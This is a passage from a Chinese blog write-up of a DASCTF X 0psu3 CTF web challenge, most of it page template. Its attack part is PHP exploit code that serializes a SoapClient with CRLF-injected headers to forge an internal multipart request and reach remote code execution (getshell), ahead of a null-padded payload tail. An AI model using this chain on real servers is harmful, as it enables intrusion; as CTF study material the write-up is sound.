00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\r\n--0f9486e921f5468f9ab50745c4c93267--\r\n&quot;</span>;
+<span class="hljs-keyword">try</span> &#123;
+    <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SoapClient</span>(<span class="hljs-literal">null</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;location&#x27;</span> =&gt; <span class="hljs-string">&quot;http://127.0.0.1/siranai.php&quot;</span>, <span class="hljs-string">&#x27;user_agent&#x27;</span> =&gt; <span class="hljs-string">&quot;Enterpr1se\r\n&quot;</span> . <span class="hljs-string">&quot;Cookie: PHPSESSION=16aaab9fb\r\nContent-Type: multipart/form-data; boundary=&quot;</span>.<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$postdata</span>,<span class="hljs-number">2</span>,<span class="hljs-number">32</span>).<span class="hljs-string">&quot;\r\nConnection: keep-alive\r\nAccept: */*\r\nContent-Length: 10416&quot;</span>.<span class="hljs-string">&quot;\r\n\r\n&quot;</span>.<span class="hljs-variable">$postdata</span>,
+        <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; <span class="hljs-string">&quot;http://127.0.0.1/siranai.php&quot;</span>));
+&#125; <span class="hljs-keyword">catch</span> (SoapFault <span class="hljs-variable">$e</span>) &#123;
+&#125;
+<span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">siroha</span>();
+<span class="hljs-variable">$b</span>-&gt;koi=[<span class="hljs-string">&quot;zhanjiangdiyishenqing&quot;</span>=&gt;[<span class="hljs-variable">$a</span>,<span class="hljs-string">&quot;nnnnn&quot;</span>]];  
+<span class="hljs-comment">//细节，数组调用类方法，调用一个不存在的方法触发__call魔术方法</span>
+<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$b</span>));</code></pre></div>
+
+<p><img src="/../images/DASCTF-X-Opsu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/image-20240118002357048.png" srcset="/img/loading.gif" lazyload alt="image-20240118002357048"></p>
+<p>生成的数据传参,记得Get那里传参一定要传有效的东西,否则脚本不会执行到反序列化那一步的.</p>
+<p>第二次访问,就会变成我们写的任意php代码,就已经getshell了</p>
+<p>复现不了一点，很烦，根本不会构造那么复杂的东西</p>
+<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>虽然都看完了，但是到了做题时，我又写不出来出题人那么厉害的python代码，即使知道了方法，也还是会做不出来。。。。。</p>
+<h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a target="_blank" rel="noopener" href="https://dxh3b3fqgc3.feishu.cn/docx/HkgmdV6Fgom3P0x0iUscKxYZnLd">DAS X 0psu3 - 飞书云文档 (feishu.cn)</a></p>
+<p><a target="_blank" rel="noopener" href="https://boogipop.com/2023/12/15/DASCTF%20X%200psu3%20Web%20Writeup/">https://boogipop.com/2023/12/15/DASCTF%20X%200psu3%20Web%20Writeup/</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>DASCTF X Opsu3十一月挑战赛</div>
+      <div>https://zer0peach.github.io/2024/01/15/DASCTF-X-Opsu3十一月挑战赛/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Zer0peach</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年1月15日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/01/17/php-Opcache%E6%8F%92%E4%BB%B6%E8%BF%9B%E8%A1%8CRCE/" title="php Opcache插件进行RCE">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">php Opcache插件进行RCE</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/01/15/2023%E9%B9%8F%E5%9F%8E%E6%9D%AF-web/" title="2023鹏城杯-web">
+                        <span class="hidden-mobile">2023鹏城杯-web</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <a href="https://zer0peach.github.io"><span>author:Zer0peach</span></a> 
+    </div>
+  
+  
+  
+    <!-- 备案信息 ICP for China -->
+    <div class="beian">
+  <span>
+    <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+      
+    </a>
+  </span>
+  
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
